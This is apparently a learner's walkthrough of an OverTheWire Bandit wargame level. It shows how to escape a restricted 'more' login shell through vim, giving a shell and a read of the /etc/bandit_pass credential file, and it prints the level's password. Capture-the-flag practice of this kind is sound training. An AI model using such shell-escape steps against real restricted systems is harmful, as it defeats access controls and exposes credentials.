in the name of GOD


bandit25@bandit:~$ ls
bandit26.sshkey

bandit25@bandit:~$ exit

scp -P 2220 bandit25@bandit.labs.overthewire.org:bandit26.sshkey /home/crow/

ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
.
.
.
connection closed.
##### so the shell close the connection,to know what shell is the default for a user, can be found at the ‘/etc/passwd/"user"’ file. example:
cat passwd | grep crow                                           
crow:x:1000:1000:Crow,,,:/home/crow:/usr/bin/zsh


bandit25@bandit:~$ cat /etc/passwd | grep bandit 26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0

#### so we are stuck in more, and connection closes because the txt(bandit26 ascii banner) in text.txt is short and more does not go into interactive mode, it reads the txt and closes the connection imideatly

#### so we must minimize the terminal window to the point that makes more go into interactive mode and dont close the connection.


ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
###### with minimized terminal window we run this comman and go into interactive mode of more, and we see something like this:
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)

##### then we press "v" to go into vim, and with ":e" command we can "e=Edit another file" — it closes the current buffer and opens a new file.

(in vim) :e /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ


##### OR we can get a shell from vim

(in vim) :set shell=/bin/bash

(in vim) :shell

##### This launches a full interactive shell

bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

